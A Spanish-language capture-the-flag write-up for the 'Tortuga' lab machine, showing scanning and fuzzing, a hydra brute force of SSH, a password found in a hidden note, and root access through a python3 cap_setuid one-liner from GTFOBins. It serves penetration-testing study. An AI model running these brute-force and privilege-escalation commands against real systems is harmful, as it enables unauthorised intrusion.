---
title: "Tortuga - TheHackerLabs"
date: 2026-02-01
draft: false
slug: "THL-writeup-tortuga"
excerpt: "Esta fue una máquina bastante sencilla. Después de analizar los escaneos, vamos directamente a la página web activa en el puerto 80, donde encontramos 2 pistas sobre la máquina, siendo la primera un usuario al que le aplicamos fuerza bruta con hydra, siendo así que descubrimos su contraseña y ganamos acceso vía SSH. La segunda pista nos lleva a un archivo oculto que contiene la contraseña de otro usuario. En ambos usuarios no tenemos privilegios dentro de la máquina, así que usamos linpeas.sh para buscar una forma de escalar privilegios, encontrando así que el binario Python3 tiene la capability SETUID. Utilizamos un comando de la guía de GTFOBins que nos permite escalar privilegios abusando de esta capability y logramos escalar privilegios."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "Web Enumeration", "Fuzzing", "Brute Force Attack", "System Recognition (Linux)", "Privesc - Abuse of Capability CAP_SETUID On Python3 Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "hydra"
  - "nxc"
  - "ssh"
  - "sudo"
  - "grep"
  - "linpeas.sh"
  - "scp"
  - "chmod"
  - "GTFOBins"
  - "python3"
links:
  - "https://github.com/peass-ng/PEASS-ng"
  - "https://gtfobins.org/gtfobins/python/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-tortuga/tortuga.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.180
PING 192.168.100.180 (192.168.100.180) 56(84) bytes of data.
64 bytes from 192.168.100.180: icmp_seq=1 ttl=64 time=3.68 ms
64 bytes from 192.168.100.180: icmp_seq=2 ttl=64 time=0.894 ms
64 bytes from 192.168.100.180: icmp_seq=3 ttl=64 time=0.981 ms
64 bytes from 192.168.100.180: icmp_seq=4 ttl=64 time=1.79 ms

--- 192.168.100.180 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3016ms
rtt min/avg/max/mdev = 0.894/1.834/3.675/1.118 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.180 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-01 16:20 -0600
Initiating ARP Ping Scan at 16:20
Scanning 192.168.100.180 [1 port]
Completed ARP Ping Scan at 16:20, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:20
Scanning 192.168.100.180 [65535 ports]
Discovered open port 22/tcp on 192.168.100.180
Discovered open port 80/tcp on 192.168.100.180
Completed SYN Stealth Scan at 16:21, 9.47s elapsed (65535 total ports)
Nmap scan report for 192.168.100.180
Host is up, received arp-response (0.00087s latency).
Scanned at 2026-02-01 16:20:55 CST for 9s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.71 seconds
           Raw packets sent: 72897 (3.207MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente hay dos puertos abiertos. Ni más ni menos.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.100.180 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-01 16:21 -0600
Nmap scan report for 192.168.100.180
Host is up (0.00081s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)

| ssh-hostkey: 
|   256 bd:bc:74:bc:a6:ab:09:29:2d:88:42:16:91:93:b1:a4 (ECDSA)
|_  256 3b:99:fe:7e:ab:ae:b3:a7:05:b2:d1:73:08:6e:e7:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))

|_http-title: Isla Tortuga
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: XX (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.83 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Analizando el escaneo, vemos que la página web activa en el **puerto 80** utiliza **Apache2**, pero no vemos más información, así que vamos a revisarla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-tortuga/Captura1.png">
</p>

Parece ser una página sobre piratas.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-tortuga/Captura2.png">
</p>

No nos dice mucho.

Tenemos dos páginas que podemos visitar; veamos la primera:

<p align="center">
<img src="/assets/images/THL-writeup-tortuga/Captura3.png">
</p> 

Aquí nos dejan una pista y remarcan el nombre **grumete**, siendo que puede ser un usuario de la máquina víctima.

Veamos la segunda página:

<p align="center">
<img src="/assets/images/THL-writeup-tortuga/Captura4.png">
</p>

Vemos los nombres de la tripulación tortuga y nos dejan un mensaje que puede ser una pista.

Al ver que se usan páginas creadas con **PHP**, puede que existan más, así que apliquemos **Fuzzing** para ver qué más encontramos.

### Fuzzing {#fuzz}

Primero probemos con **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Miscellaneous/Words/real_academia_espanola_RAE_spanish_105582_words.txt:FUZZ -u http://192.168.100.180/FUZZ -t 300 -mc 200,302 -e .php,.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.180/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Miscellaneous/Words/real_academia_espanola_RAE_spanish_105582_words.txt
 :: Extensions       : .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200,302
________________________________________________

mapa.php                [Status: 200, Size: 922, Words: 304, Lines: 42, Duration: 26ms]
tripulacion.php         [Status: 200, Size: 993, Words: 185, Lines: 34, Duration: 17ms]
:: Progress: [316746/316746] :: Job [1/1] :: 145 req/sec :: Duration: [0:02:06] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*	     | Para especificar una extensión a buscar. |
| *-mc*	     | Para aplicar un flitro que solo muestra resultados con un código de estado especifico. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.100.180 -w /usr/share/wordlists/seclists/Miscellaneous/Words/real_academia_espanola_RAE_spanish_105582_words.txt -t 300 -x php,txt --ne
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.180
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Miscellaneous/Words/real_academia_espanola_RAE_spanish_105582_words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
mapa.php             (Status: 200) [Size: 922]
tripulacion.php      (Status: 200) [Size: 993]
Progress: 316746 / 316746 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para especificar una extensión a buscar. |
| *--ne*     | Para que no muestre errores. |

No encontramos nada más.

De momento, tenemos lo que puede ser un usuario válido de la máquina víctima, siendo el nombre **gruemete**, por lo que podemos aplicarle **Fuerza Bruta** para averiguar su contraseña.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta al Servicio SSH {#FuerzaBruta}

Para aplicar la **Fuerza Bruta** utilizaremos la herramienta **hydra** y el wordlist **rockyou.txt**:
```bash
hydra -l 'grumete' -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.180 -t 64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-01 16:32:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.100.180:22/
[STATUS] 556.00 tries/min, 556 tries in 00:01h, 14343875 to do in 429:59h, 32 active
[22][ssh] host: 192.168.100.180   login: grumete   password: **********
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 28 final worker threads did not complete until end.
[ERROR] 28 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-01 16:34:59
```

Podemos comprobar que la contraseña funciona con la herramienta **netexec**:
```bash
nxc ssh 192.168.100.180 -u 'grumete' -p '**********'
SSH         192.168.100.180   22     192.168.100.180    [*] SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7
SSH         192.168.100.180   22     192.168.100.180    [+] grumete:**********  Linux - Shell access!
```
Excelente, sí es correcta.

Entremos vía **SSH**:
```bash
ssh grumete@192.168.100.180
grumete@192.168.100.180's password: 
Linux TheHackersLabs-Tortuga 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64
...
Last login: Sun Feb  1 22:37:38 2026
grumete@TheHackersLabs-Tortuga:~$ whoami
grumete
```
Estamos dentro.

Aquí podemos encontrar la flag del usuario:
```bash
grumete@TheHackersLabs-Tortuga:~$ ls
user.txt
grumete@TheHackersLabs-Tortuga:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Escalando Privilegios Abusando de Capability SETUID en Binario Python {#capabilities}

Veamos qué privilegios tenemos:
```bash
grumete@TheHackersLabs-Tortuga:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-Tortuga: No existe ninguna dirección asociada al nombre
[sudo] contraseña para grumete: 
Sorry, user grumete may not run sudo on TheHackersLabs-Tortuga.
```
Ninguno.

Leamos el `/etc/passwd` para ver los usuarios de la máquina:
```bash
grumete@TheHackersLabs-Tortuga:~$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
capitan:x:1001:1001::/home/capitan:/bin/bash
grumete:x:1002:1002::/home/grumete:/bin/bash
```
Aparte del nuestro, hay otro usuario llamado **capitan**.

Si recordamos, en la página web nos indicaron que le dejaron una nota al **usuario grumete**. Revisando todos los archivos de este usuario, veremos la nota como un archivo oculto:
```bash
grumete@TheHackersLabs-Tortuga:~$ ls -la
total 28
drwxr-xr-x 2 grumete grumete 4096 feb  1 22:46 .
drwxr-xr-x 4 root    root    4096 sep  5 11:49 ..
lrwxrwxrwx 1 grumete grumete    9 sep  5 11:59 .bash_history -> /dev/null
-rw-r--r-- 1 grumete grumete  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 grumete grumete 3564 sep  5 11:48 .bashrc
-rw-r--r-- 1 root    root     791 sep  5 13:23 .nota.txt
-rw-r--r-- 1 grumete grumete  807 abr 23  2023 .profile
-r-------- 1 grumete grumete   33 sep  5 11:55 user.txt
```

Leámosla:
```bash
grumete@TheHackersLabs-Tortuga:~$ cat .nota.txt 
Querido grumete,

Parto rumbo a la isla vecina por asuntos que no pueden esperar, estaré fuera un par de días. 
Mientras tanto, confío en ti para que cuides del barco y de la tripulación como si fueran míos. 

La puerta de la cámara del timón está asegurada con la contraseña: 
    "**********"  

Recuerda, no se la reveles a nadie más. Has demostrado ser leal y firme durante todos estos años 
navegando juntos, y eres en quien más confío en estos mares traicioneros.

Mantén la guardia alta, vigila las provisiones y cuida de que ningún intruso ponga un pie en cubierta.  
Cuando regrese, espero encontrar el barco tal y como lo dejo hoy (¡y nada de usar la bodega de ron 
para hacer carreras de tortugas otra vez!).  

Con la confianza de siempre,  
— El Capitán
```
Muy bien, tenemos la contraseña del **usuario capitan**.

Vamos a probarla:
```bash
grumete@TheHackersLabs-Tortuga:~$ su capitan
Contraseña: 
capitan@TheHackersLabs-Tortuga:/home/grumete$ whoami
capitan
```

Veamos qué privilegios tiene:
```bash
capitan@TheHackersLabs-Tortuga:/home/grumete$ sudo -l
sudo: unable to resolve host TheHackersLabs-Tortuga: No existe ninguna dirección asociada al nombre
[sudo] contraseña para capitan: 
Sorry, user capitan may not run sudo on TheHackersLabs-Tortuga.
```
Tampoco tiene alguno.

Utilicemos la herramienta **linpeas** para que busque alguna vulnerabilidad.

Puedes descargarlo aquí:
* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a>

Una vez que lo tengas, utilizaremos la herramienta **scp** para cargarlo a la máquina:
```bash
scp linpeas.sh grumete@192.168.100.180:/home/grumete/
grumete@192.168.100.180's password: 
linpeas.sh
```

Vuelve a entrar, dale permisos de ejecución y ejecútalo:
```bash
grumete@TheHackersLabs-Tortuga:~$ chmod +x linpeas.sh
grumete@TheHackersLabs-Tortuga:/tmp/Privesc$ ./linpeas.s
```

Después de ejecutarlo, vemos que el binario **python3.11** tiene la capability `CAP_SETUID`:
```bash
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
...
Files with capabilities (limited to 50):
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.11 cap_setuid=ep
```

Esto también lo podemos ver con el comando **getcap**:
```bash
grumete@TheHackersLabs-Tortuga:~$ getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.11 cap_setuid=ep
```

Podemos buscar en la guía de **GTFOBins** una forma de escalar privilegios con capabilities de **Python**:
* <a href="https://gtfobins.org/gtfobins/python/" target="_blank">GTFOBins: python</a>

Encontramos una:

<p align="center">
<img src="/assets/images/THL-writeup-tortuga/Captura5.png">
</p>

Probémosla:
```bash
grumete@TheHackersLabs-Tortuga:/tmp/Privesc$ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'
root@TheHackersLabs-Tortuga:/tmp/Privesc# 
root@TheHackersLabs-Tortuga:/tmp/Privesc# whoami
root
```
Somos **Root**.

Obtengamos la última flag:
```bash
root@TheHackersLabs-Tortuga:/tmp/Privesc# cd /root
root@TheHackersLabs-Tortuga:/root# ls
root.txt
root@TheHackersLabs-Tortuga:/root# cat root.txt
...
```
Y con esto, terminamos la máquina.
